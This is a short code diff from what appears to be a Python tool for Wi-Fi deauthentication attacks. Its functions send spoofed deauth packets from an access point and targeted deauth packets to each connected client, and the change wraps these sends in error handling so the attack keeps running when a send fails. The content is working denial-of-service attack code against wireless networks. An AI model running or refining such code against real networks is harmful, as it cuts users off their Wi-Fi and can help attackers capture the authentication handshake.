@@ -8,15 +8,21 @@ def prepare_attack():
 	
 
 def send_AP_deauth(AP):
-	pkt = AP.build_AP_deauth_pkt()
-	print("Sending generic deauth packet from AP %s" % (AP.BSSID))
-	sendp(pkt, iface=network.interface_name, verbose=False)
+	try:
+		pkt = AP.build_AP_deauth_pkt()
+		print("Sending generic deauth packet from AP %s" % (AP.BSSID))
+		sendp(pkt, iface=network.interface_name, verbose=False)
+	except:
+		print("deauth packet skipped")
 
 def send_client_deauth(AP):
-	for client in AP.clients:
-		pkt = AP.build_client_deauth_pkt(client)
-		print("Sending targeted deauth packet to client %s" % (client))
-		sendp(pkt, iface=network.interface_name, verbose=False)
+	try:
+		for client in AP.clients:
+			pkt = AP.build_client_deauth_pkt(client)
+			print("Sending targeted deauth packet to client %s" % (client))
+			sendp(pkt, iface=network.interface_name, verbose=False)
+	except:
+		print("deauth packet skipped")
 
 
 def deauth_AP(BSSID):
